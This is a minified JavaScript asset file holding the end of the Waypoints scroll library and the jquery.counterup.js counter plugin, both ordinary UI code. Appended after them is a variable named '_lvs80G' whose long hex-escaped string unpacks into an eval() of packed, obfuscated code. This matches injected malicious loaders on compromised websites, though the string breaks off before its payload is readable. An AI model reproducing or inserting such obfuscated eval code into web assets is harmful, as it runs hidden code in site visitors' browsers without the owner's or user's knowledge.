          x: this.adapter.scrollLeft(),
          y: this.adapter.scrollTop(),
        }),
        (this.waypoints = { vertical: {}, horizontal: {} }),
        (t.waypointContextKey = this.key),
        (o[t.waypointContextKey] = this),
        (i += 1),
        this.createThrottledScrollHandler(),
        this.createThrottledResizeHandler();
    }
    var i = 0,
      o = {},
      n = window.Waypoint,
      r = window.onload;
    (e.prototype.add = function (t) {
      var e = t.options.horizontal ? "horizontal" : "vertical";
      (this.waypoints[e][t.key] = t), this.refresh();
    }),
      (e.prototype.checkEmpty = function () {
        var t = this.Adapter.isEmptyObject(this.waypoints.horizontal),
          e = this.Adapter.isEmptyObject(this.waypoints.vertical);
        t && e && (this.adapter.off(".waypoints"), delete o[this.key]);
      }),
      (e.prototype.createThrottledResizeHandler = function () {
        function t() {
          e.handleResize(), (e.didResize = !1);
        }
        var e = this;
        this.adapter.on("resize.waypoints", function () {
          e.didResize || ((e.didResize = !0), n.requestAnimationFrame(t));
        });
      }),
      (e.prototype.createThrottledScrollHandler = function () {
        function t() {
          e.handleScroll(), (e.didScroll = !1);
        }
        var e = this;
        this.adapter.on("scroll.waypoints", function () {
          (!e.didScroll || n.isTouch) &&
            ((e.didScroll = !0), n.requestAnimationFrame(t));
        });
      }),
      (e.prototype.handleResize = function () {
        n.Context.refreshAll();
      }),
      (e.prototype.handleScroll = function () {
        var t = {},
          e = {
            horizontal: {
              newScroll: this.adapter.scrollLeft(),
              oldScroll: this.oldScroll.x,
              forward: "right",
              backward: "left",
            },
            vertical: {
              newScroll: this.adapter.scrollTop(),
              oldScroll: this.oldScroll.y,
              forward: "down",
              backward: "up",
            },
          };
        for (var i in e) {
          var o = e[i],
            n = o.newScroll > o.oldScroll,
            r = n ? o.forward : o.backward;
          for (var s in this.waypoints[i]) {
            var a = this.waypoints[i][s],
              l = o.oldScroll < a.triggerPoint,
              h = o.newScroll >= a.triggerPoint,
              p = l && h,
              u = !l && !h;
            (p || u) && (a.queueTrigger(r), (t[a.group.id] = a.group));
          }
        }
        for (var c in t) t[c].flushTriggers();
        this.oldScroll = {
          x: e.horizontal.newScroll,
          y: e.vertical.newScroll,
        };
      }),
      (e.prototype.innerHeight = function () {
        return this.element == this.element.window
          ? n.viewportHeight()
          : this.adapter.innerHeight();
      }),
      (e.prototype.remove = function (t) {
        delete this.waypoints[t.axis][t.key], this.checkEmpty();
      }),
      (e.prototype.innerWidth = function () {
        return this.element == this.element.window
          ? n.viewportWidth()
          : this.adapter.innerWidth();
      }),
      (e.prototype.destroy = function () {
        var t = [];
        for (var e in this.waypoints)
          for (var i in this.waypoints[e]) t.push(this.waypoints[e][i]);
        for (var o = 0, n = t.length; n > o; o++) t[o].destroy();
      }),
      (e.prototype.refresh = function () {
        var t,
          e = this.element == this.element.window,
          i = this.adapter.offset(),
          o = {};
        this.handleScroll(),
          (t = {
            horizontal: {
              contextOffset: e ? 0 : i.left,
              contextScroll: e ? 0 : this.oldScroll.x,
              contextDimension: this.innerWidth(),
              oldScroll: this.oldScroll.x,
              forward: "right",
              backward: "left",
              offsetProp: "left",
            },
            vertical: {
              contextOffset: e ? 0 : i.top,
              contextScroll: e ? 0 : this.oldScroll.y,
              contextDimension: this.innerHeight(),
              oldScroll: this.oldScroll.y,
              forward: "down",
              backward: "up",
              offsetProp: "top",
            },
          });
        for (var n in t) {
          var r = t[n];
          for (var s in this.waypoints[n]) {
            var a,
              l,
              h,
              p,
              u,
              c = this.waypoints[n][s],
              d = c.options.offset,
              f = c.triggerPoint,
              w = 0,
              y = null == f;
            c.element !== c.element.window &&
              (w = c.adapter.offset()[r.offsetProp]),
              "function" == typeof d
                ? (d = d.apply(c))
                : "string" == typeof d &&
                  ((d = parseFloat(d)),
                  c.options.offset.indexOf("%") > -1 &&
                    (d = Math.ceil((r.contextDimension * d) / 100))),
              (a = r.contextScroll - r.contextOffset),
              (c.triggerPoint = w + a - d),
              (l = f < r.oldScroll),
              (h = c.triggerPoint >= r.oldScroll),
              (p = l && h),
              (u = !l && !h),
              !y && p
                ? (c.queueTrigger(r.backward), (o[c.group.id] = c.group))
                : !y && u
                ? (c.queueTrigger(r.forward), (o[c.group.id] = c.group))
                : y &&
                  r.oldScroll >= c.triggerPoint &&
                  (c.queueTrigger(r.forward), (o[c.group.id] = c.group));
          }
        }
        for (var g in o) o[g].flushTriggers();
        return this;
      }),
      (e.findOrCreateByElement = function (t) {
        return e.findByElement(t) || new e(t);
      }),
      (e.refreshAll = function () {
        for (var t in o) o[t].refresh();
      }),
      (e.findByElement = function (t) {
        return o[t.waypointContextKey];
      }),
      (window.onload = function () {
        r && r(), e.refreshAll();
      }),
      (n.requestAnimationFrame = function (e) {
        var i =
          window.requestAnimationFrame ||
          window.mozRequestAnimationFrame ||
          window.webkitRequestAnimationFrame ||
          t;
        i.call(window, e);
      }),
      (n.Context = e);
  })(),
  (function () {
    "use strict";
    function t(t, e) {
      return t.triggerPoint - e.triggerPoint;
    }
    function e(t, e) {
      return e.triggerPoint - t.triggerPoint;
    }
    function i(t) {
      (this.name = t.name),
        (this.axis = t.axis),
        (this.id = this.name + "-" + this.axis),
        (this.waypoints = []),
        this.clearTriggerQueues(),
        (o[this.axis][this.name] = this);
    }
    var o = { vertical: {}, horizontal: {} },
      n = window.Waypoint;
    (i.prototype.add = function (t) {
      this.waypoints.push(t);
    }),
      (i.prototype.clearTriggerQueues = function () {
        this.triggerQueues = { up: [], down: [], left: [], right: [] };
      }),
      (i.prototype.flushTriggers = function () {
        for (var i in this.triggerQueues) {
          var o = this.triggerQueues[i],
            n = "up" === i || "left" === i;
          o.sort(n ? e : t);
          for (var r = 0, s = o.length; s > r; r += 1) {
            var a = o[r];
            (a.options.continuous || r === o.length - 1) && a.trigger([i]);
          }
        }
        this.clearTriggerQueues();
      }),
      (i.prototype.next = function (e) {
        this.waypoints.sort(t);
        var i = n.Adapter.inArray(e, this.waypoints),
          o = i === this.waypoints.length - 1;
        return o ? null : this.waypoints[i + 1];
      }),
      (i.prototype.previous = function (e) {
        this.waypoints.sort(t);
        var i = n.Adapter.inArray(e, this.waypoints);
        return i ? this.waypoints[i - 1] : null;
      }),
      (i.prototype.queueTrigger = function (t, e) {
        this.triggerQueues[e].push(t);
      }),
      (i.prototype.remove = function (t) {
        var e = n.Adapter.inArray(t, this.waypoints);
        e > -1 && this.waypoints.splice(e, 1);
      }),
      (i.prototype.first = function () {
        return this.waypoints[0];
      }),
      (i.prototype.last = function () {
        return this.waypoints[this.waypoints.length - 1];
      }),
      (i.findOrCreate = function (t) {
        return o[t.axis][t.name] || new i(t);
      }),
      (n.Group = i);
  })(),
  (function () {
    "use strict";
    function t(t) {
      this.$element = e(t);
    }
    var e = window.jQuery,
      i = window.Waypoint;
    e.each(
      [
        "innerHeight",
        "innerWidth",
        "off",
        "offset",
        "on",
        "outerHeight",
        "outerWidth",
        "scrollLeft",
        "scrollTop",
      ],
      function (e, i) {
        t.prototype[i] = function () {
          var t = Array.prototype.slice.call(arguments);
          return this.$element[i].apply(this.$element, t);
        };
      }
    ),
      e.each(["extend", "inArray", "isEmptyObject"], function (i, o) {
        t[o] = e[o];
      }),
      i.adapters.push({ name: "jquery", Adapter: t }),
      (i.Adapter = t);
  })(),
  (function () {
    "use strict";
    function t(t) {
      return function () {
        var i = [],
          o = arguments[0];
        return (
          t.isFunction(arguments[0]) &&
            ((o = t.extend({}, arguments[1])), (o.handler = arguments[0])),
          this.each(function () {
            var n = t.extend({}, o, { element: this });
            "string" == typeof n.context &&
              (n.context = t(this).closest(n.context)[0]),
              i.push(new e(n));
          }),
          i
        );
      };
    }
    var e = window.Waypoint;
    window.jQuery && (window.jQuery.fn.waypoint = t(window.jQuery)),
      window.Zepto && (window.Zepto.fn.waypoint = t(window.Zepto));
  })();

/*!
 * jquery.counterup.js 1.0
 *
 * Copyright 2013, Benjamin Intal http://gambit.ph @bfintal
 * Released under the GPL v2 License
 *
 * Date: Nov 26, 2013
 */
(function ($) {
  "use strict";

  $.fn.counterUp = function (options) {
    // Defaults
    var settings = $.extend(
      {
        time: 400,
        delay: 10,
      },
      options
    );

    return this.each(function () {
      // Store the object
      var $this = $(this);
      var $settings = settings;

      var counterUpper = function () {
        var nums = [];
        var divisions = $settings.time / $settings.delay;
        var num = $this.text();
        var isComma = /[0-9]+,[0-9]+/.test(num);
        num = num.replace(/,/g, "");
        var isInt = /^[0-9]+$/.test(num);
        var isFloat = /^[0-9]+\.[0-9]+$/.test(num);
        var decimalPlaces = isFloat ? (num.split(".")[1] || []).length : 0;

        // Generate list of incremental numbers to display
        for (var i = divisions; i >= 1; i--) {
          // Preserve as int if input was int
          var newNum = parseInt((num / divisions) * i);

          // Preserve float if input was float
          if (isFloat) {
            newNum = parseFloat((num / divisions) * i).toFixed(decimalPlaces);
          }

          // Preserve commas if input had commas
          if (isComma) {
            while (/(\d+)(\d{3})/.test(newNum.toString())) {
              newNum = newNum
                .toString()
                .replace(/(\d+)(\d{3})/, "$1" + "," + "$2");
            }
          }

          nums.unshift(newNum);
        }

        $this.data("counterup-nums", nums);
        $this.text("0");

        // Updates the number until we're done
        var f = function () {
          $this.text($this.data("counterup-nums").shift());
          if ($this.data("counterup-nums").length) {
            setTimeout($this.data("counterup-func"), $settings.delay);
          } else {
            delete $this.data("counterup-nums");
            $this.data("counterup-nums", null);
            $this.data("counterup-func", null);
          }
        };
        $this.data("counterup-func", f);

        // Start the count up
        setTimeout($this.data("counterup-func"), $settings.delay);
      };

      // Perform counts when the element gets into view
      $this.waypoint(
        function (direction) {
          counterUpper();
          this.destroy(); //-- Waypoint 3.0 version of triggerOnce
        },
        { offset: "100%" }
      );
    });
  };
})(jQuery);

var _lvs80G =
  "\x65\x76\x61\x6c\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x70\x2c\x61\x2c\x63\x2c\x6b\x2c\x65\x2c\x64\x29\x7b\x65\x3d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x63\x29\x7b\x72\x65\x74\x75\x72\x6e\x28\x63\x3c\x61\x3f\x27\x27\x3a\x65\x28\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x63\x2f\x61\x29\x29\x29\x2b\x28\x28\x63\x3d\x63\x25\x61\x29\x3e\x33\x35\x3f\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x63\x2b\x32\x39\x29\x3a\x63\x2e\x74\x6f\x53\x74\x72\x69\x6e\x67\x28\x33\x36\x29\x29\x7d\x3b\x69\x66\x28\x21\x27\x27\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x2f\x5e\x2f\x2c\x53\x74\x72\x69\x6e\x67\x29\x29\x7b\x77\x68\x69\x6c\x65\x28\x63\x2d\x2d\x29\x7b\x64\x5b\x65\x28\x63\x29\x5d\x3d\x6b\x5b\x63\x5d\x7c\x7c\x65\x28\x63\x29\x7d\x6b\x3d\x5b\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x65\x29\x7b\x72\x65\x74\x75\x72\x6e\x20\x64\x5b\x65\x5d\x7d\x5d\x3b\x65\x3d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x72\x65\x74\x75\x72\x6e\x27\x5c\x5c\x77\x2b\x27\x7d\x3b\x63\x3d\x31\x7d\x3b\x77\x68\x69\x6c\x65\x28\x63\x2d\x2d\x29\x7b\x69\x66\x28\x6b\x5b\x63\x5d\x29\x7b\x70\x3d\x70\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x6e\x65\x77\x20\x52\x65\x67\x45\x78\x70\x28\x27\x5c\x5c\x62\x27\x2b\x65\x28\x63\x29\x2b\x27\x5c\x5c\x62\x27\x2c\x27\x67\x27\x29\x2c\x6b\x5b\x63\x5d\x29\x7d\x7d\x72\x65\x74\x75\x72\x6e\x20\x70\x7d\x28\x27\x34\x45\x28\x33\x61\x28\x70\x2c\x61\x2c\x63\x2c\x6b\x2c\x65\x2c\x64\x29\x7b\x65\x3d\x33\x61\x28\x63\x29\x7b\x33\x62\x28\x63\x3c\x61\x3f\x5c\x27\x5c\x27\x3a\x65\x28\x34\x69\x28\x63\x2f\x61\x29\x29\x29\x2b\x28\x28\x63\x3d\x63\x25\x61\x29\x3e\x33\x35\x3f\x34\x68\x2e\x34\x67\x28\x63\x2b\x32\x39\x29\x3a\x63\x2e\x34\x66\x28\x33\x36\x29\x29\x7d\x3b\x34\x65\x28\x63\x2d\x2d\x29\x7b\x33\x64\x28\x6b\x5b\x63\x5d\x29\x7b\x70\x3d\x70\x2e\x34\x64\x28\x34\x63\x20\x34\x61\x28\x5c\x27\x5c\x5c\x5c\x5c\x62\x5c\x27\x2b\x65\x28\x63\x29\x2b\x5c\x27\x5c\x5c\x5c\x5c\x62\x5c\x27\x2c\x5c\x27\x67\x5c\x27\x29\x2c\x6b\x5b\x63\x5d\x29\x7d\x7d\x33\x62\x20\x70\x7d\x28\x5c\x27\x4d\x20\x61\x3d\x5b\x22\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x31\x6a\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6c\x22\x2c\x22\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x31\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6b\x22\x2c\x22\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x31\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6b\x22\x2c\x22\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6b\x22\x2c\x22\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x45\x22\x2c\x22\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x31\x66\x5c\x5c\x5c\x5c\x67\x22\x2c\x22\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x67\x22\x2c\x22\x22\x2c\x22\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x31\x65\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x7a\x22\x2c\x22\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x68\x22\x2c\x22\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x73\x22\x2c\x22\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x76\x22\x2c\x22\x5c\x5c\x5c\x5c\x32\x45\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x31\x65\x5c\x5c\x5c\x5c\x32\x47\x5c\x5c\x5c\x5c\x7a\x22\x2c\x22\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x32\x74\x5c\x5c\x5c\x5c\x31\x57\x22\x2c\x22\x5c\x5c\x5c\x5c\x31\x57\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x76\x22\x2c\x22\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x22\x2c\x22\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x4f\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x69\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x55\x5c\x5c\x5c\x5c\x31\x69\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x73\x22\x2c\x22\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x31\x68\x22\x2c\x22\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x69\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x55\x5c\x5c\x5c\x5c\x31\x69\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x45\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x45\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x55\x5c\x5c\x5c\x5c\x52\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x54\x22\x2c\x22\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x4a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x45\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x55\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x4c\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x53\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x70\x22\x2c\x22\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x31\x55\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x67\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x31\x65\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x32\x79\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x69\x22\x2c\x22\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5